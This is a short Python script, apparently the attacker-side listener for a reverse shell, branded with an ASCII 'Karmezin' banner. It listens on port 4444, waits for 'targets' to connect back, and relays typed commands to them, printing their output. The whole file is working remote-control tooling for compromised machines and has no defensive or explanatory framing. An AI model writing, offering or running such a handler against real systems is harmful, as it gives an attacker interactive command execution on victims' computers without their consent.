import socket
from time import sleep
import subprocess


def create_server(host, port):
    try:
        server = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM,
                )
        server.bind((host, port))
        server.listen()
        print("[+]Server started!")
        print("[+]Waiting for targets connections!")
    except Exception as erro:
        print(erro)
        print("[-]Something went wrong while star the server!")
        print(f"[-]Exception Call:{erro}")
        sleep(1)
        print("[-]Closing the server!")
        server.close()
    else:
        conn, addr = server.accept()
        print(f"[+]Connection established with {addr[0]}")
        return conn, addr


def shell(conn, addr):
    print("[+]Shell started")
    while True:
        try:
            conn.settimeout(2)
            cmd = input("shell>>")
            if cmd.lower() == 'q':
                print("[+]Closing target shell!")
                conn.close()
                break
            else:
               conn.send(cmd.encode() + b'\n')
               print(conn.recv(4096).decode(), end='')
        except TimeoutError:
            continue
        except KeyboardInterrupt:
            print("\n[+]Closing connection with target!")
            conn.close()
            break
        else:
            continue


def main(host, port):
    subprocess.run("clear")

    print(r"""
    ____  __.                                  .__         
    |    |/ _|____ _______  _____   ____ _______|__| ____   
    |      < \__  \\_  __ \/     \_/ __ \\___   /  |/    \  
    |    |  \ / __ \|  | \/  Y Y  \  ___/ /    /|  |   |  \ 
    |____|__ (____  /__|  |__|_|  /\___  >_____ \__|___|  / 
       \/    \/            \/     \/      \/       \/ """)
    conn, addr = create_server(host, port)
    shell(conn, addr)


if __name__ == "__main__":
    main("192.168.1.100", 4444)
